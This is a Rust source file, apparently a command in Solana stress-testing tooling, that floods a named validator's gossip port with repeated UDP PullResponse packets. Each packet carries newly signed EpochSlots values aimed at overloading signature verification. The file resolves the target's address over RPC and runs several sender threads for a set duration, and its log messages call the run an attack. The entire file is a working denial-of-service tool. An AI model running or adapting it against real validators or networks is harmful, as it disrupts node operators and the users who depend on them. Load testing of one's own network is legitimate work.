use {
    clap::Args,
    humantime::Duration,
    log::info,
    solana_commitment_config::CommitmentConfig,
    solana_gossip::{
        crds_data::CrdsData, crds_value::CrdsValue, epoch_slots::EpochSlots, protocol::Protocol,
    },
    solana_keypair::Keypair,
    solana_net_utils::bind_to_unspecified,
    solana_pubkey::Pubkey,
    solana_rpc_client::nonblocking::rpc_client::RpcClient,
    solana_signer::Signer,
    std::{
        fmt::Debug,
        str::FromStr,
        sync::{
            atomic::{AtomicUsize, Ordering},
            Arc,
        },
        thread,
        time::{Duration as StdDuration, Instant},
    },
};

#[derive(Args, Debug)]
pub struct FloodSigverifyArgs {
    /// The public key of the target validator
    #[arg(long, value_name = "PUBKEY")]
    pub target_validator: Pubkey,

    /// Number of broadcast threads to use for the attack
    #[arg(long, value_name = "COUNT", default_value_t = 4)]
    pub broadcast_threads: u32,

    /// Time duration for the whole attack.
    #[arg(long, value_name = "TIME", default_value_t = StdDuration::from_secs(10).into())]
    pub total_duration: Duration,
}

// some enums in case we want to expand to other message types
#[derive(Copy, Clone, Debug)]
enum CrdsDataType {
    EpochSlots,
}

#[derive(Copy, Clone, Debug)]
enum MessageType {
    Pull,
}

pub async fn run(
    json_rpc_url: &str,
    FloodSigverifyArgs {
        target_validator,
        broadcast_threads,
        total_duration,
    }: FloodSigverifyArgs,
) -> Result<(), String> {
    let rpc_client =
        RpcClient::new_with_commitment(json_rpc_url.to_owned(), CommitmentConfig::confirmed());

    // use validator pubkey to fetch validator tvu address and shred version
    let nodes = rpc_client
        .get_cluster_nodes()
        .await
        .expect("failed to fetch cluster node info from rpc");
    let node = nodes
        .iter()
        .find(|node| Pubkey::from_str(node.pubkey.as_str()).unwrap() == target_validator)
        .ok_or_else(|| {
            "failed to find validator corresponding to provided public key".to_string()
        })?;
    let gossip_addr = node
        .gossip
        .ok_or_else(|| "validator node config doesn't contain shred version".to_string())?;

    info!(
        "JSON RPC url: {json_rpc_url}\nGoing to attack validator {target_validator} at \
         {gossip_addr:?}\nwith the {broadcast_threads} broadcast threads for {total_duration:?} \
         seconds.",
    );

    let start_time = Instant::now();
    let packet_count = Arc::new(AtomicUsize::new(0));
    (0..broadcast_threads)
        .map(|i| {
            let packet_count = Arc::clone(&packet_count);
            let total_duration: StdDuration = total_duration.into();

            info!("starting UDP sender thread {i}");
            thread::spawn(move || {
                // initialize thread-local UDP socket
                let send_socket =
                    bind_to_unspecified().expect("Failed to bind to unspecified address");
                // we can use copies of the same packet since the pipeline doesn't appear to have de-dupping
                let packet = get_gossip_packet(10, MessageType::Pull, CrdsDataType::EpochSlots);

                // process shreds from the channel
                while start_time.elapsed() < total_duration {
                    if send_socket.send_to(&packet, gossip_addr).is_err() {
                        continue;
                    }

                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            })
        })
        .collect::<Vec<_>>()
        .into_iter()
        .for_each(|b| b.join().expect("error joining broadcast thread"));

    info!(
        "Finished sending {} shreds",
        packet_count.load(Ordering::Relaxed)
    );
    Ok(())
}

fn get_gossip_packet(
    values_per_packet: usize,
    message_type: MessageType,
    data_type: CrdsDataType,
) -> Vec<u8> {
    let values = create_crds_values(values_per_packet, data_type);

    // Pack them into the chosen message type
    let message = match message_type {
        MessageType::Pull => Protocol::PullResponse(Pubkey::new_unique(), values),
    };

    bincode::serialize(&message).expect("Failed to serialize gossip message")
}

// Creates CrdsValues with valid structure but potentially invalid signatures
fn create_crds_values(count: usize, data_type: CrdsDataType) -> Vec<CrdsValue> {
    let mut values = Vec::with_capacity(count);

    for _ in 0..count {
        // Create a real keypair for the CrdsValue
        let keypair = Keypair::new();
        let pubkey = keypair.try_pubkey().unwrap();

        // Create a CrdsValue based on the selected type
        let crds_data = match data_type {
            CrdsDataType::EpochSlots => CrdsData::EpochSlots(0, EpochSlots::new(pubkey, 0)),
        };

        values.push(CrdsValue::new(crds_data, &keypair));
    }

    values
}
